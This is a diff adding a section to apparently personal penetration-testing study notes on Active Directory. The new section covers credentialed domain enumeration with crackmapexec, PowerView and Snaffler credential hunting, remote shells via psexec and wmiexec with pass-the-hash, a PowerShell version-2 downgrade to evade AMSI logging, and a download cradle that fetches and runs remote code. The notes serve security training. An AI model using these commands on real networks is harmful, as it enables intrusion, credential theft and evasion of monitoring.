@@ -157,6 +157,63 @@ This is often how one cracked/dumped local-admin hash cascades into the whole ne
 - **Mitigate:** MFA, least privilege, strong password policy/filters, separate admin vs user accounts, LAPS.
 - **External spray surfaces** (same technique, internet-facing): M365 / OWA, Citrix / VMware Horizon / RDS, VPN portals (Fortinet, SonicWall), custom AD-auth web apps.
 
+## Credentialed enumeration (once I have a valid domain account)
+First real account unlocks deep enumeration. Feed everything into **BloodHound**.
+
+### Enumerate defenses first (know what's watching)
+```powershell
+Get-MpComputerStatus                              # Defender
+Get-AppLockerPolicy -Effective | select -Expand RuleCollections   # AppLocker
+$ExecutionContext.SessionState.LanguageMode       # Constrained Language Mode?
+Get-NetFirewallProfile ; Get-HotFix ; Get-BitLockerVolume
+# LAPS (LAPSToolkit): Find-LAPSDelegatedGroups, Find-AdmPwdExtendedRights, Get-LAPSComputers
+```
+
+### From Linux
+```bash
+crackmapexec smb <DC> -u <u> -p <p> --users --groups --loggedon-users --shares
+crackmapexec smb <DC> -u <u> -p <p> -M spider_plus --share '<share>'   # spider shares
+smbmap -u <u> -p <p> -d <domain> -H <DC> -R '<share>'                  # recursive share listing
+rpcclient -U "" -N <DC>          # enumdomusers, queryuser <rid>
+windapsearch.py -d <domain> --dc-ip <DC> -u <u> -p <p> --users --gpos
+# interactive shells (also -hashes LM:NT for PtH)
+psexec.py <domain>/<u>:'<p>'@<HOST>
+wmiexec.py <domain>/<u>:'<p>'@<HOST>
+```
+
+### From Windows
+```powershell
+# built-in AD module (stealthy)
+Import-Module ActiveDirectory
+Get-ADDomain ; Get-ADTrust -Filter *
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # SPN/kerberoastable
+Get-ADGroupMember -Identity "Domain Admins"
+# PowerView / SharpView (situational awareness)
+Import-Module .\PowerView.ps1    # (Set-ExecutionPolicy Bypass -Scope Process first)
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+Get-DomainTrustMapping
+Test-AdminAccess -ComputerName <host>      # where am I local admin?
+Get-DomainUser -TrustedToAuth              # delegation
+# Snaffler — hunt creds/secrets across shares
+Snaffler.exe -s -d <domain> -o snaffler.log -v data
+```
+
+### Living off the Land (no tools uploaded, stealthier, log-evasion)
+When on a managed host with no internet/tooling, built-ins do the enum:
+```text
+# host:  hostname, systeminfo, set, echo %USERDOMAIN%, echo %logonserver%
+# PS history:  Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+# net:   net user /domain, net group "Domain Admins" /domain, net localgroup administrators,
+#        net group "Domain Controllers" /domain, net share, net view /domain   (net1 = less-monitored alias)
+# wmic:  wmic useraccount list, wmic group list, wmic ntdomain list, wmic qfe (patches)
+# dsquery user / dsquery computer
+```
+- `powershell.exe -version 2` downgrades to evade modern logging (AMSI/ScriptBlock) — a known evasion.
+- Download cradle (file transfer onto host): `iex(New-Object Net.WebClient).DownloadString('<URL>')` — flagged by AMSI; covered more in module 07.
+
+> The pattern: enumerate defenses → pick tooling that survives them (built-in/LotL under AppLocker+CLM) → map everything in BloodHound → the shortest path to DA appears. Snaffler + share spidering find the creds people leave lying around.
+
 ## AD attack flow (reference)
 Key ports: 88 (Kerberos), 135/593 (RPC), 139/445 (SMB), 389/636/3268/3269 (LDAP/GC), 464 (kpasswd), 3389 (RDP).
 
